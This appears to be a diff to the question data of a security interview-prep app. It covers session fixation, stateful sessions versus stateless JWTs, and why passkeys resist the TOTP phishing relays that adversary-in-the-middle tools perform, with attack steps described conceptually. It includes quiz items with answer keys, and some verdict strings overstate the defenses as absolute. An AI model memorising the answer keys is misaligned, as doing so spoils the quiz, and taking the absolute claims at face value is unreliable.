-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Modern frameworks (e.g. Express session.regenerate(), Spring Security migrateSession()) defend against session fixation by enforcing an immutable rule: whenever a user authenticates, changes roles, or steps up permissions, the server destroys the old session ID in Redis and issues a fresh 128-bit CSPRNG token in Set-Cookie. The attacker's 'FIXED_999' is rendered completely orphaned and useless.",
+        "whyItMatters": "Guarantees that credentials acquired anonymously can never be elevated into authenticated sessions.",
+        "securityVerdict": "Session fixation definitively prevented through mandatory session renewal upon login.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "OWASP Session Regeneration Standard",
+          "method": "POST /login (Hardened)",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Set-Cookie: session_id=NEW_6a8f1b2c4e9; HttpOnly; Secure; SameSite=Lax; Path=/",
+            "X-Session-Status: Regenerated"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always invalidate the existing session ID and generate a fresh, high-e...\" }",
-          "securityAction": "Final defensive control verified: New Session ID secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Old session FIXED_999 purged from Redis. New session NEW_6a8f1b2c4e9 issued to alice.",
+          "securityAction": "Auth controller purges pre-login session; generates cryptographically random token before sending response.",
+          "statusBadge": "SESSION REGENERATED"
         }
       }
     ],
@@ -1745,15 +1763,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "Always invalidate the existing session ID and generate a fresh, high-entropy cryptographic token whenever a user changes privilege levels (logging in, switching tenants, or elevating to admin).",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"How does a Session Fixation attack work and why must session IDs regenerate upon login?\"?",
+      "question": "What is the definitive defense against Session Fixation attacks when a user logs in to a web application?",
       "options": [
-        "Set-Cookie: sid=NEW_CRYPTOGRAPHIC_ID; HttpOnly",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "Destroy the pre-authentication session identifier and issue a brand-new cryptographically random session ID immediately upon successful login",
+        "Hash the user's password using MD5 and store it in the session cookie",
+        "Restrict session cookies to GET requests only and disable POST methods",
+        "Keep the same session ID forever so the user never has to log in again"
       ],
       "correctIndex": 0,
-      "explanation": "Always invalidate the existing session ID and generate a fresh, high-entropy cryptographic token whenever a user changes privilege levels (logging in, switching tenants, or elevating to admin)."
+      "explanation": "Session fixation works because the attacker pre-allocates a session ID that the victim uses during login. The definitive defense is session regeneration: immediately upon login or privilege elevation, destroy the anonymous session and allocate a fresh cryptographic token, orphaning the attacker's fixed ID."
     }
   },
   {
@@ -1791,144 +1809,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Stateless Verification",
+        "label": "Stateful Redis Sessions (Instant Revocation)",
         "from": "client",
-        "to": "jwt_verifier",
-        "packet": "Verify RS256 Signature (Zero DB Lookups)",
-        "caption": "Step 1: Stateless JWTs allow microservices to verify identity locally using public keys without querying a centralized session store.",
-        "status": "normal",
-        "whatIsHappeningTitle": "Step 1: Stateless Verification",
-        "whatIsHappeningText": "Step 1: Stateless JWTs allow microservices to verify identity locally using public keys without querying a centralized session store.",
+        "to": "server",
+        "packet": "GET /api (Cookie: sid=abc...) -> Server looks up session in Redis",
+        "caption": "Step 1: Stateful sessions store state in centralized Redis. Advantage: Instant revocation upon logout, password reset, or compromise.",
+        "status": "defense",
+        "whatIsHappeningTitle": "Step 1: Stateful Redis Sessions",
+        "whatIsHappeningText": "Step 1: Stateful sessions store state in centralized Redis. Advantage: Instant revocation upon logout, password reset, or compromise.",
         "terms": [
           {
-            "term": "Origin",
-            "definition": "The unique tuple of protocol scheme, hostname, and port number."
+            "term": "Stateful Session",
+            "definition": "Architecture where client holds an opaque reference ID, and server stores session state in a centralized store (e.g. Redis)."
           },
           {
-            "term": "SOP Boundary",
-            "definition": "Browser security rule isolating DOM and network access across different origins."
+            "term": "Instant Revocation",
+            "definition": "Ability to immediately invalidate an active session by deleting its key from the central database."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "In a stateful model, the client receives an opaque random session ID (e.g. 's_98f12'). For every request, the API gateway or backend queries a Redis cluster (GET session:s_98f12) to retrieve user roles and metadata. When an employee is fired, an administrator clicks 'Revoke All Sessions', deleting the Redis key in under 1 millisecond.",
+        "whyItMatters": "Provides absolute, immediate authorization control necessary for high-security enterprise and banking applications.",
+        "securityVerdict": "Maximum revocation control at the cost of cross-service database query latency.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "Redis Session Protocol",
+          "method": "DEL session:s_98f12",
           "headers": [
-            "Host: api.stateful.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Cluster-Node: redis-primary.internal",
+            "Latency: 0.8ms"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Stateful Redis\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Stateful Redis.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "Session s_98f12 deleted. User usr_812 immediately blocked from all active browser sessions.",
+          "securityAction": "Redis key purged. Next incoming request immediately returns 401 Unauthorized.",
+          "statusBadge": "INSTANTLY REVOKED"
         }
       },
       {
         "id": 2,
-        "label": "Revocation Problem",
+        "label": "Stateless JWT Architecture (Scale Advantage)",
         "from": "client",
-        "to": "jwt_verifier",
-        "packet": "User Banned -> JWT remains valid for 60 minutes!",
-        "caption": "Step 2: Security drawback: Pure stateless JWTs cannot be revoked immediately before expiration unless a centralized blacklist is introduced.",
-        "status": "attack",
-        "whatIsHappeningTitle": "Step 2: Revocation Problem",
-        "whatIsHappeningText": "Step 2: Security drawback: Pure stateless JWTs cannot be revoked immediately before expiration unless a centralized blacklist is introduced.",
+        "to": "server",
+        "packet": "GET /api (Authorization: Bearer eyJhbGciOi...) -> Microservices verify locally",
+        "caption": "Step 2: Stateless JWTs encapsulate claims and signatures. Advantage: Microservices verify tokens locally with zero DB lookups.",
+        "status": "normal",
+        "whatIsHappeningTitle": "Step 2: Stateless JWT Architecture",
+        "whatIsHappeningText": "Step 2: Stateless JWTs encapsulate claims and signatures. Advantage: Microservices verify tokens locally with zero DB lookups.",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "Stateless JWT (RFC 7519)",
+            "definition": "Self-contained token containing user claims, expiration, and cryptographic signature verified locally without database queries."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Horizontal Scalability",
+            "definition": "Handling millions of concurrent requests across hundreds of distributed microservices without database bottlenecks."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "A stateless JWT embeds user claims (sub, roles, tenant) and is signed using asymmetric crypto (RS256/ES256). Any microservice possessing the auth server's public key (JWKS) can verify the token in CPU memory within microseconds, without querying a central session database. This enables massive horizontal scalability across global regions.",
+        "whyItMatters": "Removes centralized database dependencies from the critical path of high-throughput distributed microservices.",
+        "securityVerdict": "Maximum performance and decoupling achieved through mathematical cryptography.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "RFC 7519 / RS256 Verification",
+          "method": "Local In-Memory CPU Verification",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "Authorization: Bearer eyJhbGciOiJSUzI1NiIs...",
+            "Local-Check: Public Key Cache (JWKS)"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Stateful Redis validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "Claims verified locally in 0.04ms: { \"sub\": \"usr_491\", \"tenant\": \"corp_a\", \"exp\": 1775038400 }",
+          "securityAction": "Microservice verifies signature and timestamp in local memory; zero database queries dispatched.",
+          "statusBadge": "VERIFIED IN-MEMORY"
         }
       },
       {
         "id": 3,
-        "label": "Stateful Instant Revocation",
-        "from": "client",
-        "to": "redis_store",
-        "packet": "DEL session:user_123 (Instant Kill across all devices)",
-        "caption": "Step 3: Stateful sessions in Redis allow instant session termination, password resets, and concurrent session tracking at the cost of a DB hop.",
-        "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Stateful Instant Revocation",
-        "whatIsHappeningText": "Step 3: Stateful sessions in Redis allow instant session termination, password resets, and concurrent session tracking at the cost of a DB hop.",
+        "label": "The Stateless Revocation Dilemma",
+        "from": "attacker",
+        "to": "server",
+        "packet": "Attacker replays valid stolen JWT; server accepts it because signature and exp are valid",
+        "caption": "Step 3: Critical trade-off: A purely stateless JWT cannot be revoked until it expires, unless you introduce a stateful blocklist.",
+        "status": "attack",
+        "whatIsHappeningTitle": "Step 3: The Stateless Revocation Dilemma",
+        "whatIsHappeningText": "Step 3: Critical trade-off: A purely stateless JWT cannot be revoked until it expires, unless you introduce a stateful blocklist.",
         "terms": [
           {
-            "term": "Authorization Check",
-            "definition": "Validating permission scopes and roles before granting resource access."
+            "term": "Token Revocation Dilemma",
+            "definition": "The fundamental security trade-off where self-contained tokens cannot be invalidated without re-introducing state."
           },
           {
-            "term": "Payload Security",
-            "definition": "Ensuring data transmission integrity and confidentiality over HTTPS."
+            "term": "Token Blacklist / Denylist",
+            "definition": "A cache of revoked JWT IDs (jti) checked before accepting a token, re-introducing database lookups."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "If an employee's laptop is stolen or a JWT is compromised, a purely stateless service will continue honoring the token until the 'exp' timestamp passes. If you build a Redis denylist to check revoked 'jti' tokens, you have re-introduced centralized database lookups, negating the primary scalability benefit of statelessness.",
+        "whyItMatters": "One of the most frequent architectural debate questions in principal and senior engineering interviews.",
+        "securityVerdict": "Pure statelessness is mutually exclusive with instant single-token revocation.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "RFC 7519 Expiration Window",
+          "method": "Stolen Token Replay Attempt",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Authorization: Bearer eyJhbGciOiJSUzI1NiIs...",
+            "Exp-Remaining: 42 minutes"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Stateless JWT Engine\" }",
-          "securityAction": "Backend service Stateless JWT Engine enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "Signature valid, exp not reached. Server without denylist cannot tell token was compromised.",
+          "securityAction": "Backend accepts replayed token because all cryptographic constraints pass mathematically.",
+          "statusBadge": "CANNOT REVOKE STATELESSLY"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "redis_store",
-        "to": "hybrid_arch",
-        "packet": "5-min Access JWT + Revocable Refresh Token in Redis",
-        "caption": "Step 4: Interview line: \"Stateless JWTs provide high throughput and decoupled microservice verification, while Stateful Sessions provide instant revocation — modern architectures use hybrid short-lived JWTs (5 mins) paired with revocable server-stored refresh tokens.\"",
+        "from": "server",
+        "to": "client",
+        "packet": "Hybrid Architecture: Short-Lived Access JWT (5-15m) + Stateful Refresh Token",
+        "caption": "Step 4: Interview line: \"The industry consensus is a Hybrid Pattern: issue short-lived stateless Access Tokens (5-15 minutes) for high-speed microservice verification, paired with stateful Refresh Tokens in Redis for revocation control.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"Stateless JWTs provide high throughput and decoupled microservice verification, while Stateful Sessions provide instant revocation — modern architectures use hybrid short-lived JWTs (5 mins) paired with revocable server-stored refresh tokens.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"The industry consensus is a Hybrid Pattern: issue short-lived stateless Access Tokens (5-15 minutes) for high-speed microservice verification, paired with stateful Refresh Tokens in Redis for revocation control.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Hybrid Token Architecture",
+            "definition": "Combining short-lived stateless access tokens with stateful revocable refresh tokens to balance speed and security."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Refresh Token Rotation (RTR)",
+            "definition": "Issuing a brand-new refresh token with every refresh request, invalidating the entire family if a token is reused."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "Senior engineers present the hybrid pattern: Access Tokens are stateless JWTs with strict 5 to 15-minute lifespans, maximizing microservice speed. Refresh tokens are stored statefully in Redis and held in an HttpOnly cookie. When an account is compromised, the refresh token is revoked in Redis; the attacker's access window is capped at the remaining minutes of the access token.",
+        "whyItMatters": "Balances horizontal microservice scalability with strict enterprise security and revocation requirements.",
+        "securityVerdict": "Gold-standard token architecture balancing performance and security boundaries.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "OAuth 2.0 / RFC 6749 Hybrid Flow",
+          "method": "POST /auth/token/refresh",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Cookie: __Host-refresh_token=rt_98214fa; HttpOnly; Secure",
+            "Content-Type: application/json"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"For monolithic and standard web applications, stateful Redis sessions ...\" }",
-          "securityAction": "Final defensive control verified: Hybrid Best Practice secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "Refresh token valid in Redis. Rotated new rt_10283 issued; new 10-minute access token granted.",
+          "securityAction": "Auth server validates stateful refresh token in Redis; issues new short-lived stateless JWT.",
+          "statusBadge": "HYBRID BALANCE"
         }
       }
     ],
@@ -1966,15 +1983,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "For monolithic and standard web applications, stateful Redis sessions are simpler and more secure. For distributed microservices, use short-lived access JWTs (5-15 mins) coupled with stateful refresh token rotation.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"What are the architectural and security trade-offs between Stateful Sessions and Stateless JWTs?\"?",
+      "question": "How do modern high-scale architectures resolve the trade-off between the performance of stateless JWTs and the instant revocation of stateful sessions?",
       "options": [
-        "5-min Access JWT + Revocable Refresh Token in Redis",
-        "Rely on frontend UI obfuscation and hidden buttons",
-        "Disable all CORS headers globally",
-        "Store all sensitive session secrets in localStorage"
+        "By using a Hybrid Model: short-lived stateless access JWTs (5-15 min) for fast microservice validation, paired with stateful refresh tokens stored in Redis for centralized revocation",
+        "By setting the JWT expiration time to 365 days and disabling all token revocation features",
+        "By generating a new 2048-bit RSA key pair for every individual HTTP request",
+        "By storing all session tokens in the browser's URL query string"
       ],
       "correctIndex": 0,
-      "explanation": "For monolithic and standard web applications, stateful Redis sessions are simpler and more secure. For distributed microservices, use short-lived access JWTs (5-15 mins) coupled with stateful refresh token rotation."
+      "explanation": "A hybrid model captures the best of both worlds: short-lived access tokens allow microservices to verify claims in-memory without database bottlenecks, while stateful refresh tokens allow immediate revocation upon logout, password change, or security compromise."
     }
   },
   {
@@ -2012,136 +2029,143 @@ export const questionsData: QuestionData[] = [
     "steps": [
       {
         "id": 1,
-        "label": "Reverse Proxy Phishing (SMS/TOTP)",
-        "from": "victim_user",
-        "to": "attacker_proxy",
-        "packet": "Victim enters password + TOTP on evil-bank.com",
-        "caption": "Step 1: Real-time phishing proxies (Evilginx) intercept credentials and 6-digit TOTP codes, forwarding them to the real site to steal session cookies.",
+        "label": "Phishing Real-Time Relay (SMS / TOTP Failure)",
+        "from": "attacker",
+        "to": "victim",
+        "packet": "Adversary-in-the-Middle (Evilginx) proxies victim TOTP code to real bank",
+        "caption": "Step 1: SMS and standard 6-digit TOTP apps (Google Authenticator) are vulnerable to real-time reverse proxy phishing (Evilginx).",
         "status": "attack",
-        "whatIsHappeningTitle": "Step 1: Reverse Proxy Phishing (SMS/TOTP)",
-        "whatIsHappeningText": "Step 1: Real-time phishing proxies (Evilginx) intercept credentials and 6-digit TOTP codes, forwarding them to the real site to steal session cookies.",
+        "whatIsHappeningTitle": "Step 1: Phishing Real-Time Relay",
+        "whatIsHappeningText": "Step 1: SMS and standard 6-digit TOTP apps (Google Authenticator) are vulnerable to real-time reverse proxy phishing (Evilginx).",
         "terms": [
           {
-            "term": "AiTM Phishing Proxy",
-            "definition": "Adversary-in-the-Middle tool (e.g. Evilginx) proxying credentials and OTPs in real-time."
+            "term": "Adversary-in-the-Middle (AitM) Phishing",
+            "definition": "Using a reverse proxy (e.g. Evilginx) to intercept credentials, TOTP codes, and session cookies in real time."
+          },
+          {
+            "term": "Shared Secret Vulnerability",
+            "definition": "TOTP relies on symmetric shared secrets (HMAC) that produce a static code enterable on any fake login portal."
           }
         ],
-        "deepExplanation": "Step 1 begins with the client issuing the baseline communication packet. The network transport layer establishes TLS 1.3 mutual parameters and delivers the initial payload to the entrypoint perimeter.",
-        "whyItMatters": "Establishes a hardened encryption baseline before any sensitive security claims or tokens are exchanged.",
-        "securityVerdict": "Secure transport layer guarantees confidentiality in transit.",
+        "deepExplanation": "Attacker deploys a reverse-proxy phishing site (e.g. bank.com.attacker-login.io). The victim enters their password and their 6-digit TOTP code. The reverse proxy immediately relays the code to the real bank server within seconds, harvests the authenticated session cookie, and bypasses traditional MFA entirely.",
+        "whyItMatters": "SMS and TOTP codes lack cryptographic binding to the browser's URL bar, making them susceptible to automated phishing toolkits.",
+        "securityVerdict": "Shared-secret MFA cannot defend against modern AitM reverse proxy toolkits.",
         "telemetry": {
-          "protocol": "TLS 1.3 / HTTP Protocol Stack",
-          "method": "Client Request Initiation",
+          "protocol": "HTTP/2 AitM Reverse Proxy",
+          "method": "POST /login/totp-challenge",
           "headers": [
-            "Host: api.mfa.io",
-            "User-Agent: EnterpriseSec-Agent/4.2",
-            "Sec-Fetch-Mode: cors"
+            "Host: bank.com.attacker-login.io",
+            "X-Forwarded-To: real-bank.com"
           ],
-          "payloadPreview": "{ \"context\": \"initial_handshake\", \"target\": \"Victim User\" }",
-          "securityAction": "Client establishes encrypted TLS tunnel and initiates protocol handshake to Victim User.",
-          "statusBadge": "INITIALIZED"
+          "payloadPreview": "{\"username\": \"bob\", \"totp_code\": \"491820\"} -> Relayed to authentic server in 400ms.",
+          "securityAction": "Adversary proxy steals authenticated session cookie from authentic server response.",
+          "statusBadge": "TOTP PHISHED"
         }
       },
       {
         "id": 2,
-        "label": "WebAuthn Challenge Request",
-        "from": "real_bank",
-        "to": "victim_user",
-        "packet": "Challenge + Relying Party ID (\"bank.com\")",
-        "caption": "Step 2: Bank challenges the client using WebAuthn/FIDO2 standard. Browser queries user's physical security key or device Passkey.",
+        "label": "WebAuthn / Passkey Hardware Challenge",
+        "from": "server",
+        "to": "client",
+        "packet": "navigator.credentials.get({ publicKey: { challenge, rpId: 'bank.com' } })",
+        "caption": "Step 2: WebAuthn issues a cryptographically random challenge bound to the authentic Relying Party ID (rpId: 'bank.com').",
         "status": "normal",
-        "whatIsHappeningTitle": "Step 2: WebAuthn Challenge Request",
-        "whatIsHappeningText": "Step 2: Bank challenges the client using WebAuthn/FIDO2 standard. Browser queries user's physical security key or device Passkey.",
+        "whatIsHappeningTitle": "Step 2: WebAuthn Challenge",
+        "whatIsHappeningText": "Step 2: WebAuthn issues a cryptographically random challenge bound to the authentic Relying Party ID (rpId: 'bank.com').",
         "terms": [
           {
-            "term": "Preflight (OPTIONS)",
-            "definition": "An automatic HTTP request verifying whether cross-origin methods/headers are permitted."
+            "term": "WebAuthn (W3C / FIDO2)",
+            "definition": "Web standard enabling browser-level public-key cryptography using hardware authenticators (YubiKey, FaceID, TouchID)."
           },
           {
-            "term": "CORS Headers",
-            "definition": "Response headers informing the browser if response reading is permitted."
+            "term": "Relying Party ID (rpId)",
+            "definition": "The exact domain name (e.g. bank.com) cryptographically evaluated by the hardware authenticator."
           }
         ],
-        "deepExplanation": "In Step 2, the intermediary security layer intercepts the packet. It inspects parameters against policy definitions, decodes headers, evaluates rate limits, and validates compliance with security RFCs.",
-        "whyItMatters": "Catches malformed payloads, injection vectors, and unauthorized origin traffic at the outer perimeter.",
-        "securityVerdict": "Perimeter enforcement prevents unauthorized computational load on backend servers.",
+        "deepExplanation": "When signing in with WebAuthn or Passkeys, the server generates a 32-byte cryptographic challenge and specifies its registered Relying Party ID ('bank.com'). The browser invokes the native operating system's authenticator (Apple Keychain, Windows Hello, Android Biometrics, or USB YubiKey).",
+        "whyItMatters": "Transitions authentication from shared symmetric secrets (passwords/TOTP) to asymmetric public-key cryptography.",
+        "securityVerdict": "Cryptographic challenge initialized with strict domain boundary assertion.",
         "telemetry": {
-          "protocol": "Security Inspection Engine",
-          "method": "Boundary Security Assessment",
+          "protocol": "W3C WebAuthn / CTAP2",
+          "method": "navigator.credentials.get()",
           "headers": [
-            "X-Forwarded-For: 198.51.100.24",
-            "X-Security-Policy: Strict-Enforce"
+            "RelyingParty: bank.com",
+            "UserVerification: required (Biometric / PIN)"
           ],
-          "payloadPreview": "{ \"threat_score\": 0.02, \"rate_limit_tokens\": 98, \"status\": \"inspected\" }",
-          "securityAction": "Intermediary proxy Victim User validates protocol parameters and inspects request semantics.",
-          "statusBadge": "INSPECTED"
+          "payloadPreview": "{ challenge: '9b8a1f2c4e...', rpId: 'bank.com', timeout: 60000 }",
+          "securityAction": "Browser requests OS authenticator access; prompts user for biometric TouchID / FaceID gesture.",
+          "statusBadge": "CHALLENGE ISSUED"
         }
       },
       {
         "id": 3,
-        "label": "Cryptographic Origin Binding",
-        "from": "victim_user",
-        "to": "fido_authenticator",
-        "packet": "Hardware key signs (Challenge + \"evil-bank.com\")",
-        "caption": "Step 3: Security key signs the challenge bound to the actual browser URL origin (evil-bank.com) — NOT bank.com.",
+        "label": "Origin-Binding Phishing Defeat",
+        "from": "client",
+        "to": "authenticator",
+        "packet": "Authenticator checks browser URL bar: 'attacker-login.io' != 'bank.com' -> REFUSED",
+        "caption": "Step 3: The hardware authenticator extracts the true origin from the browser engine; mismatched phishing domains cannot extract credentials.",
         "status": "defense",
-        "whatIsHappeningTitle": "Step 3: Cryptographic Origin Binding",
-        "whatIsHappeningText": "Step 3: Security key signs the challenge bound to the actual browser URL origin (evil-bank.com) — NOT bank.com.",
+        "whatIsHappeningTitle": "Step 3: Origin-Binding Phishing Defeat",
+        "whatIsHappeningText": "Step 3: The hardware authenticator extracts the true origin from the browser engine; mismatched phishing domains cannot extract credentials.",
         "terms": [
           {
-            "term": "FIDO2 / WebAuthn",
-            "definition": "Public-key authentication cryptographically bound to the browser domain origin."
+            "term": "Cryptographic Origin Binding",
+            "definition": "The security property where credentials can only be signed if the browser's actual TLS origin matches the registered rpId."
+          },
+          {
+            "term": "ClientDataJSON",
+            "definition": "Browser-assembled payload containing the true origin, challenge, and type signed by the authenticator."
           }
         ],
-        "deepExplanation": "Step 3 represents backend core execution. Identity claims, digital signatures, or authorization scopes are cryptographically asserted and persisted to the audit trail before operations proceed.",
-        "whyItMatters": "Guarantees zero-trust principle: never trust the perimeter alone; always verify identity and intent.",
-        "securityVerdict": "Cryptographic assertion ensures tamper-proof verification.",
+        "deepExplanation": "Even if a victim is fooled by a lookalike phishing domain (attacker-login.io), the browser automatically supplies the real origin in clientDataJSON. The hardware authenticator looks up its secure enclave for credentials bound to 'attacker-login.io'. Finding none, it refuses to sign. Even if forced, the signature would be for 'attacker-login.io', which the real 'bank.com' server instantly rejects.",
+        "whyItMatters": "Completely eliminates credential harvesting and AitM proxy attacks at the protocol level.",
+        "securityVerdict": "Mathematical phishing immunity guaranteed by hardware origin binding.",
         "telemetry": {
-          "protocol": "Backend Core Architecture",
-          "method": "Cryptographic & Identity Verification",
+          "protocol": "CTAP2 Hardware Security Enclave",
+          "method": "Origin Verification",
           "headers": [
-            "Authorization: Scope-Validated",
-            "X-Correlation-ID: 7f8a9b-2026"
+            "Browser-Reported-Origin: https://attacker-login.io",
+            "Expected-RP-ID: bank.com"
           ],
-          "payloadPreview": "{ \"audit_log\": \"verified\", \"action\": \"Legitimate Bank API\" }",
-          "securityAction": "Backend service Legitimate Bank API enforces zero-trust access control and signs responses.",
-          "statusBadge": "ENFORCED"
+          "payloadPreview": "❌ Origin Mismatch: Authenticator refuses to sign challenge for unregistered domain.",
+          "securityAction": "Hardware authenticator detects phishing proxy origin; terminates cryptographic handshake.",
+          "statusBadge": "PHISHING IMPOSSIBLE"
         }
       },
       {
         "id": 4,
         "label": "Interview line",
-        "from": "fido_authenticator",
-        "to": "real_bank",
-        "packet": "Signature rejected: Origin mismatch!",
-        "caption": "Step 4: Interview line: \"WebAuthn / Passkeys provide mathematically unphishable MFA because the hardware authenticator signs the cryptographic challenge bound to the browser's verified domain origin.\"",
+        "from": "client",
+        "to": "server",
+        "packet": "Authentic Signature: ECDSA (P-256) over clientDataJSON + authenticatorData",
+        "caption": "Step 4: Interview line: \"WebAuthn and FIDO2 passkeys are unphishable because credentials are cryptographically bound to the browser's verified origin (rpId); an authenticator will never sign a challenge for an attacker's lookalike domain.\"",
         "status": "defense",
         "isInterviewLine": true,
         "whatIsHappeningTitle": "Step 4: Interview line",
-        "whatIsHappeningText": "Step 4: Interview line: \"WebAuthn / Passkeys provide mathematically unphishable MFA because the hardware authenticator signs the cryptographic challenge bound to the browser's verified domain origin.\"",
+        "whatIsHappeningText": "Step 4: Interview line: \"WebAuthn and FIDO2 passkeys are unphishable because credentials are cryptographically bound to the browser's verified origin (rpId); an authenticator will never sign a challenge for an attacker's lookalike domain.\"",
         "terms": [
           {
-            "term": "Defense In Depth",
-            "definition": "Layering multiple independent security controls to protect against single-point failure."
+            "term": "Phishing-Resistant MFA (OMB M-22-09)",
+            "definition": "US Cybersecurity Executive standard mandating FIDO2/WebAuthn over phishable SMS and TOTP mechanisms."
           },
           {
-            "term": "Interview Verdict",
-            "definition": "The core architecture principle to articulate to the interviewer."
+            "term": "Private Key Isolation",
+            "definition": "Private keys never leave the hardware secure enclave or synchronized encrypted passkey keychain."
           }
         ],
-        "deepExplanation": "Step 4 delivers the definitive security outcome. The architecture neutralizes malicious vectors, isolates untrusted actors, and provides tamper-evident proof to client callers and logging systems.",
-        "whyItMatters": "Provides resilient defense-in-depth, ensuring that even if one layer degrades, the core system remains secure.",
-        "securityVerdict": "Senior interview defense formula satisfied.",
+        "deepExplanation": "When the user is on the legitimate domain ('bank.com'), the authenticator uses its hardware-protected private key to sign the challenge, returning authenticatorData and a digital signature. The server verifies the signature against the registered public key. Because the private key never leaves the device and public keys are useless to steal, the entire authentication chain is tamper-proof.",
+        "whyItMatters": "Represents the ultimate evolution of consumer and enterprise authentication security.",
+        "securityVerdict": "Phishing-resistant public-key authentication verified.",
         "telemetry": {
-          "protocol": "Defensive Mitigation Layer",
-          "method": "Policy Enforcement / Verdict",
+          "protocol": "W3C WebAuthn Verification",
+          "method": "POST /api/v1/webauthn/verify",
           "headers": [
-            "X-Protection-Standard: Enterprise-Grade",
-            "Strict-Transport-Security: max-age=63072000"
+            "Content-Type: application/json",
+            "Host: bank.com"
           ],
-          "payloadPreview": "{ \"security_outcome\": \"Protected\", \"takeaway\": \"Always mandate WebAuthn / FIDO2 security keys for high-privilege admin...\" }",
-          "securityAction": "Final defensive control verified: WebAuthn Hardware Authenticator secured against exploitation.",
-          "statusBadge": "200 PROTECTED"
+          "payloadPreview": "{ id: 'cred_982...', signature: '30450221008f...', clientDataJSON: '{\"origin\":\"https://bank.com\"...}' }",
+          "securityAction": "Server verifies ECDSA P-256 signature against stored public key. Login granted.",
+          "statusBadge": "FIDO2 AUTHENTICATED"
         }
       }
     ],
@@ -2180,15 +2204,15 @@ export const questionsData: QuestionData[] = [
     "tier": "Intermediate",
     "interviewTakeaway": "Always mandate WebAuthn / FIDO2 security keys for high-privilege administrators, cloud infrastructure engineers, and critical systems where credential phishing is a primary attack vector.",
     "quiz": {
-      "question": "What is the most effective security control to resolve: \"Why is MFA critical, and why do WebAuthn / Passkeys (FIDO2) stop phishing where SMS / TOTP fail?\"?",
+      "question": "Why are WebAuthn / FIDO2 Passkeys classified as 'Phishing-Resistant' while SMS codes and TOTP apps (Google Authenticator) are vulnerable to phishing?",
       "options": [
